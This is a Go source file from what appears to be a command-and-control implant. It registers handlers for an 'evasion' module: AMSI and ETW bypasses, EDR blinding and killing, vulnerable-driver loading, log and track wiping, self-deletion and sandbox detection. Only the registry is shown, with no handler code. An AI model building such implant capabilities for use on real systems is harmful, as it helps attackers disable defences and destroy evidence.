//go:build linux || windows || darwin
// +build linux windows darwin

package main

// Task registry: the optional "evasion" module (see internal/payload/agent_modules.go).
// The generator drops this file whole when the operator excludes the module;
// every entry point below disappears with it and the linker dead-codes the
// unreferenced handlers.

func init() {
	taskHandlers["amsi_bypass"] = handleAMSIByPass
	taskHandlers["amsi_session_bypass"] = handleAMSISessionBypass
	taskHandlers["amsi_hardware_bp"] = handleAMSIHardwareBP
	taskHandlers["etw_bypass"] = handleETWByPass
	taskHandlers["etw_ntrace_bypass"] = handleETWNtraceBypass
	taskHandlers["etw_hardware_bp"] = handleETWHardwareBP
	taskHandlers["blockdlls"] = handleBlockDLLs
	taskHandlers["unhook_ntdll"] = handleUnhookNtdll
	taskHandlers["protect_process"] = handleProtectProcess
	taskHandlers["cleanup"] = handleCleanup
	taskHandlers["log_wipe"] = handleLogWipe
	taskHandlers["track_wipe"] = handleTrackWipe
	taskHandlers["self_delete"] = handleSelfDelete
	taskHandlers["set_sleep_mask"] = handleSetSleepMask
	taskHandlers["set_sleep_mask_advanced"] = handleSetSleepMaskAdvanced
	taskHandlers["run_evasion"] = handleRunEvasion
	taskHandlers["kernel_callback"] = handleEvasionKernelCallback
	taskHandlers["etwti"] = handleEvasionETWTI
	taskHandlers["enum_callbacks"] = handleEvasionEnumCallbacks
	taskHandlers["objcb"] = handleEvasionObjCB
	taskHandlers["imgload"] = handleEvasionImgLoad
	taskHandlers["edr_blind"] = handleEDRBlind
	taskHandlers["edr_kill"] = handleEDRKill
	taskHandlers["byovd_load"] = handleBYOVDLoad
	taskHandlers["ppl_check"] = handlePPLCheck
	taskHandlers["ghost_mode_status"] = handleGhostModeStatus
	taskHandlers["ghost_mode_exit"] = handleGhostModeExit
	taskHandlers["sandbox_detect"] = handleSandboxDetect
	taskHandlers["sandbox_detect_advanced"] = handleSandboxDetectAdvanced
}
